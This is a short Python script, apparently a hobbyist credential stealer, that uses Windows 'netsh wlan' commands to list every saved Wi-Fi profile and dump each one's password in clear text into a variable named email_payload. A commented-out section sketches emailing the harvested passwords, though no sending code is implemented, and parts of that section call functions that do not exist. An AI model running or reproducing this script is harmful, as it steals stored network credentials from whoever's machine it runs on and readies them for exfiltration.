#!/usr/bin/python3
#__author__ = MrT3st3r

import subprocess, re


# command = 'msg * testing message!'

command = 'netsh wlan show profiles'
network = subprocess.check_output(command, shell=True)
network = str(network)
print(type(network))
network_list = re.findall("(:\s[a-zA-z-0-9]+)", str(network))
# for i in networks_name:
print(type(network_list))
email_payload=''

www=[x.replace(": ","") for x in network_list]
yyy=[x.replace("\\r\\n","") for x in www]
print(yyy)

for y in yyy:
    command  = 'netsh wlan show profile ' + y + ' key=clear'
    results = subprocess.check_output(command, shell=True)
    email_payload = email_payload + str(results) +"\n"
print(email_payload)

"""
def get_network_pawssword(network_list):
    email_payload=''
    for network in network_list:
        command  = 'netsh wlan show profile ' + network + 'key=clear'
        results = subprocess.check_output(command, shell=True)
        email_payload = email_payload + '\n' + results
    return email_payload


network_names_list = get_network_names(get_net())
to_be_emailed = get_network_pawssword(network_names_list)
print('Email has been generated with following payload: ', to_be_emailed)
# could possibly send_email(to_be_emailed)
# print('Email successfully sent!')
"""
